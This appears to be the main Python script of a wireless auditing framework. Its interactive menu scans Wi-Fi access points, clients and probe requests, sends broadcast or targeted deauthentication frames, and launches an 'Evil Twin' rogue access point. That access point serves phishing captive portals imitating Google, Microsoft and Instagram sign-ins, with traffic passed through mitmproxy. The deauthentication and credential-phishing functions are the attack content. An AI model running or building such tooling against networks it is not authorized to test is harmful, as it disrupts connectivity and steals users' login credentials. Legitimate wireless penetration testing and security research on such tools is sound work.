#!/usr/bin/env python3
"""
Title:   802.11 Wireless Audit Framework
Author:  Huzefa Khalil Dayanji
Role:    Security Consultant
Purpose: Modular OOP framework for automated 802.11 wireless auditing, interface management, and vulnerability assessment.
"""

# Standard python modules
import os
import sys
import argparse
import threading
import subprocess
from pathlib import Path
from itertools import zip_longest

from config import Config
from ui import UI
from dependencies import DependencyManager

# Ensure dependencies are met before importing heavy hitters
DependencyManager.check_and_fix()

# Lazy Imports (post-dependency-check)
from scapy.all import sniff
from pyroute2 import NL80211

from interface_manager import InterfaceManager
from audit_engine import WirelessAuditEngine

# -----------------------------------------------------------------------------
# MAIN EXECUTION FLOW
# -----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Professional 802.11 Audit Utility")
    parser.add_argument("--iface",        help="Wireless interface name")
    parser.add_argument("--hop-interval", type=float, default=0.05)
    parser.add_argument("--channels",     help="e.g. 1,6,11")
    parser.add_argument("--no-hop",       action="store_true")
    # --band: restrict hopping to a specific band.
    # Accepts '2g'/'2G'/'2' or '5g'/'5G'/'5' (case-insensitive).
    # If omitted, the hopper alternates between 2.4 GHz and 5 GHz channels.
    parser.add_argument(
        "--band",
        help="Band to scan: '2g' for 2.4 GHz only, '5g' for 5 GHz only. "
             "Omit to alternate between both bands (default).",
        metavar="BAND",
    )
    args = parser.parse_args()

    os.system('clear')
    UI.print_banner()

    # 1. Interface Selection
    iface = args.iface
    if not iface:
        UI.section("Interface Selection")
        UI.info("Enumerating wireless adapters...")
        adapters = [d.name for d in Path("/sys/class/net").iterdir() if (d / "wireless").is_dir()]
        if not adapters:
            UI.error("No wireless hardware found.")
            sys.exit(1)

        # Display available interfaces in a table before showing the menu
        iface_rows = [[f"{UI.BOLD}{i+1}{UI.RESET}", a] for i, a in enumerate(adapters)]
        print(f"\n{UI.CYAN}{UI.BOLD}  Available Interfaces{UI.RESET}")
        from tabulate import tabulate
        print(tabulate(iface_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}Interface{UI.RESET}"], tablefmt="rounded_outline"))
        print()

        try:
            idx   = int(input(f"{UI.BOLD}  ❯ Select Interface [1-{len(adapters)}]: {UI.RESET}").strip() or 0) - 1
            if idx < 0:
                raise ValueError
            iface = adapters[idx]
        except (IndexError, ValueError, KeyboardInterrupt):
            UI.error("Invalid choice.\n")
            sys.exit(1)

    # 2. Monitor Mode Enforcement
    UI.section("Monitor Mode Setup")
    with NL80211() as iw:
        iw.bind()
        info = InterfaceManager.get_info(iw, iface)
        if info['current'] != "MONITOR":
            UI.warn(f"{iface} is in {info['current']} mode.")
            try:
                # normalize
                choice = input("  Switch to monitor mode? [Y/n]: ").strip().lower()
                if choice in ('', 'y', 'yes'):
                   InterfaceManager.set_state(iface, "down")
                   InterfaceManager.set_mode(iface, 6) # 6 for monitor mode
                   InterfaceManager.set_state(iface, "up")
                   UI.ok(f"{iface} is now in MONITOR mode.")
                elif choice in ('n', 'no'):
                   UI.info("Goodbye :>")
                   sys.exit(0)
                else:
                    UI.error("Invalid choice.")
                    sys.exit(1)
            except KeyboardInterrupt:
                print()
                UI.info("Goodbye :>")
                sys.exit(1)

    # 3. Startup
    # audit is created ONCE here so that audit.results (the discovered APs)
    # survive across menu iterations — they live in RAM for the whole session.
    audit = WirelessAuditEngine(iface)

    hopper_thread = None

    def start_hopper():
        nonlocal hopper_thread
        if args.no_hop:
            return
        if hopper_thread and hopper_thread.is_alive():
            return
        audit.stop_hopper.clear()
        hopper_thread = threading.Thread(
            target=audit.hopper_loop,
            args=(chans, args.hop_interval),
            daemon=True,
        )
        hopper_thread.start()

    def stop_hopper():
        audit.stop_hopper.set()
        if hopper_thread and hopper_thread.is_alive():
            hopper_thread.join(timeout=0.5)

    # --- Band / channel list resolution ---
    # Priority: --channels > --band > default (both bands alternated)
    if args.channels:
        # explicit channel list always wins
        chans = [int(c) for c in args.channels.split(',')]
    elif args.band:
        # normalise: strip trailing 'g'/'G', keep the digit(s)
        band_key = args.band.strip().lower().rstrip('g')  # '2g' → '2', '5G' → '5'
        if band_key == '2':
            chans = list(Config._2GHZ.keys())   # channels 1-14
            UI.info("Band locked to 2.4 GHz.")
        elif band_key == '5':
            chans = list(Config._5GHZ.keys())   # 5 GHz channels
            UI.info("Band locked to 5 GHz.")
        else:
            UI.error(f"Unknown band '{args.band}'. Use '2g' or '5g'.")
            sys.exit(1)
    else:
        # No --band given — interleave 2.4 GHz and 5 GHz channels so the
        # hopper visits both bands in a single sweep (2G ch, 5G ch, 2G ch, …)
        chans_2g = list(Config._2GHZ.keys())
        chans_5g = list(Config._5GHZ.keys())
        # zip_longest-style interleave; pad the shorter list by cycling it
        chans = [
            ch for pair in zip_longest(chans_2g, chans_5g)
            for ch in pair if ch is not None
        ]
        UI.info("No band specified — hopping across both 2.4 GHz and 5 GHz channels.")

    # -------------------------------------------------------------------------
    # 4. Main menu loop
    #
    # The loop keeps the script alive between operations so that audit.results
    # (APs discovered by option 1) remain in memory.  Ctrl+C behaviour:
    #   • ALL options → KeyboardInterrupt is caught locally → loop back to menu
    #
    # sniff() is always run in a daemon thread (never on the main thread) so
    # that Python owns SIGINT and KeyboardInterrupt is reliably catchable.
    # -------------------------------------------------------------------------
    while True:
        # Show menu and get user's choice on every iteration
        user_choice = UI.show_menu()
        if not user_choice:
            # user chose 0 or sent EOF
            print()
            UI.info("Goodbye :>")
            break

        # Start (or restart) the hopper thread for this operation.
        # We reset the stop event first so the new thread isn't born stopped.
        # audit.stop_hopper.clear()
        # if not args.no_hop:
        #     threading.Thread(
        #         target=audit.hopper_loop,
        #         args=(chans, args.hop_interval),
        #         daemon=True,
        #     ).start()
        #     UI.ok(f"Hopper started on {len(chans)} channels.")
        start_hopper()

        UI.divider()

        # this is where i'll add more conditional based callback functions for scapy's sniff.
        if user_choice == 1:
            # we also want to make sure while switching to monitor mode
            # during step 2, we kill the process which could cause intereference
            # such as NetworkManager and wpa_supplicant
            UI.section("Discovering Access Points")
            UI.info("Press Ctrl+C to stop scanning and return to the main menu...")

            # Run sniff() in a daemon thread so the MAIN thread stays free to
            # catch KeyboardInterrupt.  Scapy swallows SIGINT internally when
            # sniff() owns the main thread, which is why Ctrl+C was terminating
            # the script instead of being caught by our except block.
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=audit.beacon_frame,
                    store=0,
                    # scapy's stop_filter is polled after every packet;
                    # when stop_sniff is set the thread exits cleanly.
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()  # main thread blocks here — Ctrl+C is catchable
            except KeyboardInterrupt:
                # Signal the sniff thread to stop, then wait for it to finish.
                # Results are preserved in audit.results (in RAM).
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                UI.ok(f"Scan stopped. {len(audit.results)} AP(s) found — returning to menu.")
                continue  # <── back to top of while loop → show menu again

        elif user_choice == 2:
            # ── Guard: AP scan must have been run first ────────────────────
            stop_hopper()
            if not audit.results:
                UI.error("No AP data found.")
                UI.warn("Please run option 1 (Discover Access Points) first, then retry.")
                audit.stop_hopper.set()
                continue  # back to menu instead of crashing out

            # ── Let user pick the target AP from the discovered list ───────
            UI.section("Enumerate Connected Devices")
            a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
            if not a_bssid:
                UI.info("No target selected. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.info("Press Ctrl+C to stop and return to the main menu...")

            # Same threaded sniff pattern as option 1 — keeps main thread free
            # to catch KeyboardInterrupt so Ctrl+C loops back to the menu.
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.data_frames(pkt, a_bssid, iface, a_channel),
                    store=0,
                    # scapy's stop_filter is polled after every packet;
                    # when stop_sniff is set the thread exits cleanly.
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()  # main thread blocks here — Ctrl+C is catchable
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                UI.ok("Scan stopped — returning to menu.")
                continue  # <── back to top of while loop → show menu again

        elif user_choice == 3:
            stop_hopper()
            if not audit.results:
                UI.error("No AP data found.")
                UI.warn("Please run option 1 (Discover Access Points) first, then retry.")
                audit.stop_hopper.set()
                continue
            UI.section("Vulnerability Assessment")
            a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
            print(type(a_channel))
            if not a_bssid:
                UI.info("No target selected. Returning to menu...")
                audit.stop_hopper.set()
                continue

            InterfaceManager.set_channel(iface, a_channel)

            UI.info("Sending probe request and checking for a response...")
            got_response = audit.send_probe_request(ssid=a_bssid, iface=iface, channel=a_channel)

            if not got_response:
                UI.warn(
                    "AP did not respond to the Probe Request. It may have "
                    "SSID broadcast disabled, be out of range, on a different "
                    "channel than expected, or filtering probe requests. "
                    "Check main.py option 1 results for the correct channel/BSSID, "
                    "and try moving closer to the AP before retrying."
                )
                audit.stop_hopper.set()
                continue

            UI.ok("AP responded — proceeding with full assessment.")
            UI.info("Press Ctrl+C to stop and return to the main menu...")

            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.vuln_assessment(pkt, s_bssid=a_bssid, iface=iface, channel=a_channel),
                    store=False,
                    timeout=10,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                UI.ok("Assessment stopped — returning to menu.")
                continue

        # elif user_choice == 4:
        #     UI.section("Deauthentication Attack")

        #     target_bssid = None
        #     target_channel = None

        #     if audit.results:
        #         target_bssid, target_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
        #         if not target_bssid:
        #             UI.info("No target selected. Returning to menu...")
        #             audit.stop_hopper.set()
        #             continue
        #     else:
        #         UI.warn("No AP data found from option 1.")
        #         try:
        #             target_bssid = input("Enter target AP BSSID/MAC: ").strip()
        #             target_channel = input("Enter target channel: ").strip()
        #             target_channel = int(target_channel) if target_channel else None
        #         except (KeyboardInterrupt, ValueError):
        #             print()
        #             UI.info("Selection cancelled. Returning to menu...")
        #             audit.stop_hopper.set()
        #             continue

        #         if not target_bssid or target_channel is None:
        #             UI.error("Target BSSID and channel are required.")
        #             audit.stop_hopper.set()
        #             continue

        #     try:
        #         InterfaceManager.set_channel(iface, target_channel)
        #     except Exception as e:
        #         UI.error(f"Unable to switch channel: {e}")
        #         audit.stop_hopper.set()
        #         continue

        #     UI.info("Press Ctrl+C to stop and return to the main menu...")

        #     stop_sniff = threading.Event()
        #     sniff_thread = threading.Thread(
        #         target=sniff,
        #         kwargs=dict(
        #             iface=iface,
        #             prn=lambda pkt: audit.deauth_frame(
        #                 iface=iface,
        #                 transmitter_mac=target_bssid,
        #                 receiver_mac=target_bssid,
        #             ),
        #             store=0,
        #             stop_filter=lambda _pkt: stop_sniff.is_set(),
        #         ),
        #         daemon=True,
        #     )
        #     sniff_thread.start()

        #     try:
        #         sniff_thread.join()
        #     except KeyboardInterrupt:
        #         stop_sniff.set()
        #         sniff_thread.join()
        #         audit.stop_hopper.set()
        #         print()
        #         UI.ok("Deauth attack stopped — returning to menu.")
        #         continue
        elif user_choice == 4:
            stop_hopper()
            UI.section("Deauthentication Attack")

            target_bssid = None
            target_channel = None

            if audit.results:
                target_bssid, target_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
                if not target_bssid:
                    UI.info("No target selected. Returning to menu...")
                    audit.stop_hopper.set()
                    continue
            else:
                UI.warn("No AP data found from option 1.")
                try:
                    target_bssid = input("Enter target AP BSSID/MAC: ").strip()
                    target_channel = input("Enter target channel: ").strip()
                    target_channel = int(target_channel) if target_channel else None
                except (KeyboardInterrupt, ValueError):
                    print()
                    UI.info("Selection cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

                if not target_bssid or target_channel is None:
                    UI.error("Target BSSID and channel are required.")
                    audit.stop_hopper.set()
                    continue
            try:
                InterfaceManager.set_channel(iface, int(target_channel))
            except Exception as e:
                UI.error(f"Unable to switch channel: {e}")
                audit.stop_hopper.set()
                continue

            mode = None
            while mode not in {"1", "2"}:
                UI.section("Target Mode")
                print("  1) Broadcast")
                print("  2) Unicast")
                mode = input("  Choose mode [1-2]: ").strip()

            if mode == "1":
                receiver_mac = "ff:ff:ff:ff:ff:ff"
                UI.ok("Broadcast mode selected.")
                # add your authorized action here
                stop_sniff = threading.Event()
                sniff_thread = threading.Thread(
                    target=sniff,
                    kwargs=dict(
                        iface=iface,
                        prn=lambda pkt: audit.deauth_frame(
                            iface=iface,
                            transmitter_mac=target_bssid,
                            receiver_mac=receiver_mac,
                        ),
                        store=0,
                        stop_filter=lambda _pkt: stop_sniff.is_set(),
                    ),
                    daemon=True,
                )
                sniff_thread.start()
                audit.stop_hopper.set()
                continue

            try:
                InterfaceManager.set_channel(iface, int(target_channel))
            except Exception as e:
                UI.error(f"Unable to switch channel: {e}")
                audit.stop_hopper.set()
                continue

            UI.section("Enumerate Connected Devices")
            UI.info("Press Ctrl+C to stop and show connected clients...")

            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.data_frames(pkt, target_bssid, iface, target_channel),
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()

            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()

            clients = getattr(audit, "clients", None) or []
            if not clients:
                UI.warn("No connected clients were discovered.")
                audit.stop_hopper.set()
                continue

            UI.section("Connected Clients")
            from tabulate import tabulate
            client_rows = [[f"{UI.BOLD}{i+1}{UI.RESET}", mac] for i, mac in enumerate(clients)]
            print(tabulate(client_rows, headers=["#", "Client MAC"], tablefmt="rounded_outline"))
            print()

            try:
                idx = int(input(f"Select client [1-{len(clients)}]: ").strip()) - 1
                if idx < 0 or idx >= len(clients):
                    raise ValueError
                selected_client = clients[idx]
            except (KeyboardInterrupt, ValueError):
                print()
                UI.info("Selection cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.ok(f"Selected client: {selected_client}")
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.deauth_frame(
                        iface=iface,
                        transmitter_mac=target_bssid,
                        receiver_mac=target_bssid,
                    ),
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            audit.stop_hopper.set()
            continue

        elif user_choice == 5:
            # ── Rogue Access Point — Evil Twin with selectable captive portal ──
            # Logic mirrors wpf_complete.py EvilTwin (hostapd/dnsmasq/iptables/mitmproxy/Flask)
            # verbatim — only addition is portal template selection.
            stop_hopper()
            UI.section("Rogue Access Point — Evil Twin (Captive Portal)")

            # Lazy import so the framework still starts even if Flask/mitmproxy are missing.
            try:
                from evil_twin import EvilTwin
            except ImportError as e:
                UI.error(f"Failed to load EvilTwin module: {e}")
                UI.warn("Ensure evil_twin.py is present and Flask is installed (pip install flask).")
                audit.stop_hopper.set()
                continue

            target_ssid: str | None = None
            target_channel: int | None = None
            target_bssid: str | None = None

            # ── Step 1: SSID / channel / BSSID ─────────────────────────────────
            # Sources: Discovered APs (option 1) and PNL Extracted list (option 6) — let user pick
            has_aps = bool(audit.results)
            has_pnl = bool(getattr(audit, 'probe_results', None) and len(audit.probe_results) > 0)
            # Build deduplicated PNL list (unique SSIDs, keep row with highest count)
            pnl_unique: dict = {}
            pnl_list: list = []
            if has_pnl:
                for row in audit.probe_results:
                    # row = [src_mac, vendor, ssid, count, last_seen]
                    try:
                        ssid = str(row[2]).strip()
                    except Exception:
                        continue
                    if not ssid or ssid in ("<Hidden>", "<wildcard>", "", None):
                        continue
                    if ssid not in pnl_unique or int(row[3]) > int(pnl_unique[ssid][3]):
                        pnl_unique[ssid] = row
                pnl_list = sorted(pnl_unique.values(), key=lambda r: int(r[3]), reverse=True)
                has_pnl = len(pnl_list) > 0

            # If either source exists, offer a unified source chooser (mirrors the AP clone prompt style)
            if has_aps or has_pnl:
                UI.info("Available SSID sources for Evil Twin (from previous scans):")
                src_rows = []
                src_map: dict = {}
                cur = 1
                if has_aps:
                    src_rows.append([f"{UI.BOLD}{cur}{UI.RESET}", f"{UI.CYAN}Discovered APs{UI.RESET}", f"{len(audit.results)} AP(s) — BSSID/channel known", "Clone exact AP"])
                    src_map[str(cur)] = "aps"
                    cur += 1
                if has_pnl:
                    src_rows.append([f"{UI.BOLD}{cur}{UI.RESET}", f"{UI.YELLOW}PNL (Probed SSIDs){UI.RESET}", f"{len(pnl_list)} unique SSID(s) from {len(audit.probe_results)} probes — SSID only", "Use probed SSID (enter channel)"])
                    src_map[str(cur)] = "pnl"
                    cur += 1
                src_rows.append([f"{UI.BOLD}{cur}{UI.RESET}", f"{UI.DIM}Manual{UI.RESET}", "Custom SSID", "Enter SSID/channel/BSSID"])
                src_map[str(cur)] = "manual"
                from tabulate import tabulate
                print(tabulate(src_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}Source{UI.RESET}", f"{UI.BOLD}Details{UI.RESET}", f"{UI.BOLD}Note{UI.RESET}"], tablefmt="rounded_outline"))
                print()
                default_choice = "1"
                try:
                    choice_raw = input(f"{UI.BOLD}  ❯ Choose source [1-{len(src_map)}] (default {default_choice}): {UI.RESET}").strip() or default_choice
                except (KeyboardInterrupt, EOFError):
                    print()
                    UI.info("Cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue
                chosen_src = src_map.get(choice_raw)
                if not chosen_src:
                    UI.warn(f"Invalid choice '{choice_raw}' — defaulting to manual.")
                    chosen_src = "manual"

                if chosen_src == "aps":
                    a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
                    if not a_bssid:
                        UI.info("No target selected. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    for row in audit.results:
                        if row[0] == a_bssid and str(row[1]) == str(a_channel):
                            raw_ssid = row[2]
                            if raw_ssid in ("<Hidden>", "<Malformed>", "<hidden>", "", None):
                                UI.warn("Selected AP has hidden SSID — enter SSID manually.")
                                try:
                                    target_ssid = input(f"{UI.BOLD}  ❯ Enter SSID for Evil Twin: {UI.RESET}").strip()
                                except (KeyboardInterrupt, EOFError):
                                    print(); UI.info("Cancelled."); audit.stop_hopper.set(); continue
                                if not target_ssid:
                                    UI.error("SSID cannot be empty."); audit.stop_hopper.set(); continue
                            else:
                                target_ssid = str(raw_ssid)
                            target_bssid = str(a_bssid)
                            try:
                                target_channel = int(a_channel)
                            except Exception:
                                target_channel = int(row[1]) if str(row[1]).isdigit() else 6
                            break
                    if target_ssid:
                        UI.ok(f"Cloning AP → SSID: {UI.YELLOW}{target_ssid}{UI.RESET}  BSSID: {UI.CYAN}{target_bssid}{UI.RESET}  CH: {UI.CYAN}{target_channel}{UI.RESET}")
                    else:
                        UI.error("Could not resolve target AP. Returning to menu.")
                        audit.stop_hopper.set()
                        continue

                elif chosen_src == "pnl":
                    UI.section("PNL — Select SSID to Clone")
                    # Show unique PNL SSIDs sorted by count desc
                    from tabulate import tabulate
                    pnl_rows = []
                    for i, row in enumerate(pnl_list, start=1):
                        src_mac, vendor, ssid, count, last_seen = row
                        pnl_rows.append([
                            f"{UI.BOLD}{i}{UI.RESET}",
                            f"{UI.YELLOW}{ssid}{UI.RESET}",
                            f"{UI.DIM}{vendor}{UI.RESET}",
                            f"{UI.GREEN}{count}{UI.RESET}",
                            f"{UI.CYAN}{src_mac}{UI.RESET}",
                            f"{UI.DIM}{last_seen}{UI.RESET}"
                        ])
                    print(tabulate(pnl_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}SSID (Probed){UI.RESET}", f"{UI.BOLD}Vendor{UI.RESET}", f"{UI.BOLD}Count{UI.RESET}", f"{UI.BOLD}Src MAC{UI.RESET}", f"{UI.BOLD}Last Seen{UI.RESET}"], tablefmt="rounded_outline"))
                    print(f"\n{UI.DIM}Showing {len(pnl_list)} unique SSID(s) from {len(audit.probe_results)} total probes. Pick one to use as Evil Twin SSID.{UI.RESET}\n")
                    try:
                        sel_raw = input(f"{UI.BOLD}  ❯ Select PNL SSID [1-{len(pnl_list)}]: {UI.RESET}").strip()
                        sel_idx = int(sel_raw) - 1
                        if sel_idx < 0 or sel_idx >= len(pnl_list):
                            raise ValueError
                        chosen_row = pnl_list[sel_idx]
                        target_ssid = str(chosen_row[2])
                        UI.ok(f"Selected PNL SSID → {UI.YELLOW}{target_ssid}{UI.RESET} (probed by {chosen_row[0]}, {chosen_row[3]}×, vendor {chosen_row[1]})")
                    except (ValueError, KeyboardInterrupt, EOFError):
                        print()
                        UI.info("Selection cancelled. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    # PNL has no BSSID/channel — prompt for channel and optional spoof BSSID
                    try:
                        ch_raw = input(f"{UI.BOLD}  ❯ Enter channel for '{target_ssid}' [6]: {UI.RESET}").strip() or "6"
                        target_channel = int(ch_raw)
                        bssid_raw = input(f"{UI.BOLD}  ❯ Spoof BSSID for PNL SSID? (Enter to skip, or MAC): {UI.RESET}").strip() or None
                        if bssid_raw:
                            if bssid_raw.count(":") != 5:
                                UI.warn(f"BSSID '{bssid_raw}' doesn't look like a MAC — still using it.")
                            target_bssid = bssid_raw
                        else:
                            target_bssid = None
                    except (KeyboardInterrupt, EOFError, ValueError):
                        print()
                        UI.info("Cancelled. Returning to menu...")
                        audit.stop_hopper.set()
                        continue

                else:  # manual
                    pass  # fall through to manual block below

            # Manual entry fallback (no source data OR manual chosen OR source didn't set target_ssid)
            if not target_ssid:
                if has_aps or has_pnl:
                    UI.info("Enter Evil Twin details manually.")
                else:
                    UI.info("No AP/PNL data found — enter Evil Twin details manually.")
                    UI.warn("Tip: Run option 1 (Discover APs) or 6 (PNL Extractor) first to enable cloning.")
                try:
                    target_ssid = input(f"{UI.BOLD}  ❯ Enter SSID for Evil Twin AP: {UI.RESET}").strip()
                    if not target_ssid:
                        UI.error("SSID cannot be empty.")
                        audit.stop_hopper.set()
                        continue
                    ch_raw = input(f"{UI.BOLD}  ❯ Enter channel [6]: {UI.RESET}").strip() or "6"
                    target_channel = int(ch_raw)
                    bssid_raw = input(f"{UI.BOLD}  ❯ Spoof BSSID (optional, MAC to clone, Enter to skip): {UI.RESET}").strip() or None
                    if bssid_raw:
                        if bssid_raw.count(":") != 5:
                            UI.warn(f"BSSID '{bssid_raw}' does not look like a MAC — still using it.")
                        target_bssid = bssid_raw
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Selection cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

            # Ensure channel/bssid are set (clone path already set channel; manual also set).
            # If clone path had channel but manual BSSID prompt was skipped, still prompt for optional BSSID overwrite.
            if target_channel is None:
                try:
                    ch_raw = input(f"{UI.BOLD}  ❯ Enter channel [6]: {UI.RESET}").strip() or "6"
                    target_channel = int(ch_raw)
                except (ValueError, KeyboardInterrupt, EOFError):
                    target_channel = 6
            # If BSSID not yet decided and we cloned, optionally allow user to keep or change it
            if target_bssid is None:
                # For clone case, target_bssid already holds the real AP's BSSID — ask if they want to spoof it
                # (default: keep spoofed BSSID for true evil-twin). For manual case we already asked.
                if audit.results and target_ssid:
                    # Only ask if target_bssid was set via clone; otherwise already handled
                    pass
                else:
                    try:
                        bssid_raw = input(f"{UI.BOLD}  ❯ Spoof BSSID (optional, Enter to skip): {UI.RESET}").strip() or None
                        if bssid_raw:
                            target_bssid = bssid_raw
                    except (KeyboardInterrupt, EOFError):
                        pass

            # Optional: confirm/adjust BSSID when cloning (default keeps spoof)
            if audit.results and target_bssid:
                # Let user confirm or clear the spoofed BSSID
                try:
                    cur = target_bssid
                    bssid_choice = input(f"{UI.BOLD}  ❯ Spoof BSSID [{cur}] (Enter to keep, 'clear' to disable): {UI.RESET}").strip()
                    if bssid_choice.lower() == "clear":
                        target_bssid = None
                        UI.info("BSSID spoof disabled — using adapter's own MAC.")
                    elif bssid_choice:
                        target_bssid = bssid_choice
                except (KeyboardInterrupt, EOFError):
                    pass

            # ── Step 2: Captive portal template selection ──────────────────────
            portals = EvilTwin.list_portals()
            if not portals:
                portals = ["google", "microsoft", "instagram"]
            UI.section("Captive Portal Selection")
            UI.info("Choose a phishing template — each lives in captive-portal-pages/<name>/index.html:")
            from tabulate import tabulate
            portal_rows = []
            for idx, p in enumerate(portals, start=1):
                desc = {"google": "Google Sign-in", "microsoft": "Microsoft / Azure AD", "instagram": "Instagram Login"}.get(p, p)
                portal_rows.append([f"{UI.BOLD}{idx}{UI.RESET}", f"{UI.CYAN}{p}{UI.RESET}", desc, f"captive-portal-pages/{p}/index.html"])
            print(tabulate(portal_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}Template{UI.RESET}", f"{UI.BOLD}Style{UI.RESET}", f"{UI.BOLD}Path{UI.RESET}"], tablefmt="rounded_outline"))
            print()
            try:
                sel_raw = input(f"{UI.BOLD}  ❯ Select template [1-{len(portals)}] (default 1 = {portals[0]}): {UI.RESET}").strip() or "1"
                sel_idx = int(sel_raw) - 1
                if 0 <= sel_idx < len(portals):
                    portal_choice = portals[sel_idx]
                else:
                    UI.warn(f"Out of range — defaulting to {portals[0]}.")
                    portal_choice = portals[0]
            except (ValueError, KeyboardInterrupt, EOFError):
                print()
                UI.info("Selection cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue
            UI.ok(f"Portal selected → {UI.CYAN}{portal_choice}{UI.RESET}  ({UI.DIM}captive-portal-pages/{portal_choice}/index.html{UI.RESET})")

            # ── Step 3: Uplink + AP iface ──────────────────────────────────────
            try:
                uplink = input(f"{UI.BOLD}  ❯ Uplink interface (internet, Enter = auto-detect): {UI.RESET}").strip() or None
                ap_iface_input = input(f"{UI.BOLD}  ❯ AP interface [{iface}]: {UI.RESET}").strip() or iface
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("Cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.divider()
            UI.warn("Starting Evil Twin — hostapd + dnsmasq + NAT + mitmproxy + Flask portal")
            UI.warn("Requires root & hostapd/dnsmasq/iptables. Press Ctrl+C to stop and return to menu.")
            UI.info(f"Summary → SSID:{UI.YELLOW}{target_ssid}{UI.RESET}  CH:{target_channel}  "
                    f"Portal:{UI.GREEN}{portal_choice}{UI.RESET}  AP:{ap_iface_input}  Uplink:{uplink or 'auto'}  "
                    f"BSSID:{target_bssid or 'adapter default'}")
            print()

            # ── Step 4: Launch ─────────────────────────────────────────────────
            try:
                et = EvilTwin(
                    iface_ap=ap_iface_input,
                    ssid=target_ssid,
                    channel=int(target_channel),
                    portal=portal_choice,
                    bssid=target_bssid,
                    uplink_iface=uplink,
                )
                et.run()
            except KeyboardInterrupt:
                print()
                UI.ok("Evil Twin stopped — returning to menu.")
            except Exception as e:
                UI.error(f"Evil Twin error: {e}")
                import traceback; traceback.print_exc()
                try:
                    et.stop()  # type: ignore
                except Exception:
                    pass
            finally:
                audit.stop_hopper.set()
                continue

        elif user_choice == 6:
            UI.section("Probe Request Listener (PNL)")
            UI.info("Press Ctrl+C to stop and return to the main menu...")

            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=audit.probe_request,
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                # UI.ok(f"Listener stopped. {len(audit.probe_request)} unique (MAC, SSID) pair(s) captured — returning to menu.")
                continue

        else:
            print()
            UI.info("User chose something else.")
            audit.stop_hopper.set()
            continue  # back to menu for unimplemented options

        # ── Per-iteration hopper teardown ──────────────────────────────────
        # Reached when sniff() returns on its own (e.g. option 3's timeout
        # expires naturally with no Ctrl+C).  Stop the hopper and loop back
        # to the menu so the user can choose their next action.
        audit.stop_hopper.set()
        continue  # back to top of while loop → show menu again

    # ── Final cleanup — runs once when the loop exits (user chose 0 / Exit) ──
    audit.stop_hopper.set()  # safety: ensure hopper is stopped
    UI.divider()
    UI.info("Cleaning up and restoring services...")
    subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True)
    # start the wpa_supplicant as well
    subprocess.run(["systemctl", "start", "wpa_supplicant"], capture_output=True)
    InterfaceManager.set_state(iface, "down")
    InterfaceManager.set_mode(iface, 2)  # Managed
    UI.ok("Interface restored to Managed mode. Shutdown complete.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{UI.RED}[!] Error: This tool requires root privileges (sudo).{UI.RESET}")
        sys.exit(1)
    main()
